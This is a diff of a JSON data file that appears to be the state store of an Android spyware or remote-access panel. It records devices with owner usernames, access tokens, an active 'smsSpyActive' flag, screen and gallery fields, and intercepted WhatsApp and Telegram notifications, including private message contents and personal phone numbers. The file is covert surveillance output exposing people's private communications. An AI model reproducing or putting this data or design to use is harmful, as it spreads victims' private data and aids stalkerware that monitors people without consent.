@@ -5571,6 +5571,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3250 pesan dari 21 chat",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770612158
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3250 pesan dari 21 chat",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770607253
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "All Buyer Pegasus ( Full Update ): ~ Ajm",
+        "content": "P",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770606900
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (4 pesan): ~ t4mz wa stok/rekber/japost",
         "content": "📷 𝙁𝙊𝙍𝙈𝘼𝙏 𝙅𝘼𝙋𝙊𝙎𝙏 𝙏4𝙈𝙕 𝙎𝙏𝙊𝙍𝙀\n      [𝘽𝙐𝙆𝘼𝙉 𝘼𝙆𝙐𝙉 𝘼𝘿𝙈𝙄𝙉]\n\n𝙅𝙐𝘼𝙇/𝙉𝙀𝙀𝘿 : jual\n𝘼𝙆𝙐𝙉 : ff\n𝙎𝙋𝙀𝙆 : old parah v 542 sg ompet \n𝙇𝙊𝙂 :ggl bind aman aja gua kasih semua \n𝙃𝘼𝙍𝙂𝘼 : 380 boleh nego tipis\n𝙈𝘾 : [𝙏4𝙈𝙕 𝙎𝙏𝙊𝙍𝙀]\n𝙉𝙊 𝙇𝙐 : 082299345533\n\n𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐉𝐀𝐒𝐀 𝐀𝐃𝐌𝐈. [𝐓𝟒𝐌𝐙 𝐒𝐓𝐎𝐑𝐄] 𝐀𝐆𝐀𝐑 𝐓𝐄𝐑𝐇𝐈𝐍𝐃𝐀𝐑 𝐃𝐀𝐑𝐈 𝐏𝐄𝐍𝐈𝐏𝐔𝐀𝐍\n\n𝐍𝐎 𝐑𝐄𝐊𝐁𝐄𝐑/𝐉𝐏 𝐓𝐀𝐌𝐙 𝐒𝐓𝐎𝐑𝐄 𝐇𝐀𝐍𝐘𝐀 :081385347781\n\n𝐍𝐎𝐓𝐄 : 𝐉𝐈𝐊𝐀 𝐉𝐏 𝐃𝐈 𝐓𝐀𝐌𝐙 𝐒𝐓𝐎𝐑𝐄 𝐖𝐀𝐉𝐈𝐁 𝐌𝐂 𝐓𝐀𝐌𝐙 𝐒𝐓𝐎𝐑𝐄 𝐇𝐀𝐑𝐆𝐀 𝐈𝐍 𝐘𝐀𝐍𝐆 𝐉𝐏, 𝐔𝐃𝐀𝐇 𝐏𝐎𝐒𝐓 𝐀𝐊𝐔𝐍 𝐋𝐔 𝐒𝐀𝐍𝐀 𝐒𝐈𝐍𝐈!!",
         "time": "21/04 18:23",
@@ -9544,30 +9568,6 @@
         "time": "21/04 17:46",
         "pkg": "com.whatsapp",
         "receivedAt": 1776768369158
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (8 pesan): ~ WHOHH",
-        "content": "cari dimana ni stiker blay",
-        "time": "21/04 17:46",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768369148
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎106 pesan dari 6 saluran",
-        "time": "21/04 17:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768355128
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "LUCAS",
-        "content": "📷 kalian gk bisa tah lope selain merah?🗿",
-        "time": "21/04 17:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768355077
       }
     ],
     "galleryPhotos": [],
@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776770603915,
+    "lastSeen": 1776770610426,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776770604255,
+    "lastSeen": 1776770611266,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Gopit Dki",
+        "content": "Menyukai status Anda",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770607624
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Gopit Dki",
+        "content": "Menyukai status Anda",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770607463
+      },
       {
         "appName": "Telegram",
         "sender": "𝗦𝙊𝙇𝘿𝙄𝙀𝙍 𝗕𝙊𝙔 (𝟮𝟬𝟭𝟵) ™",
@@ -13626,22 +13642,6 @@
         "time": "21/04 17:59",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769143205
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:59",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769143191
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:59",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769143178
       }
     ],
     "galleryPhotos": [],
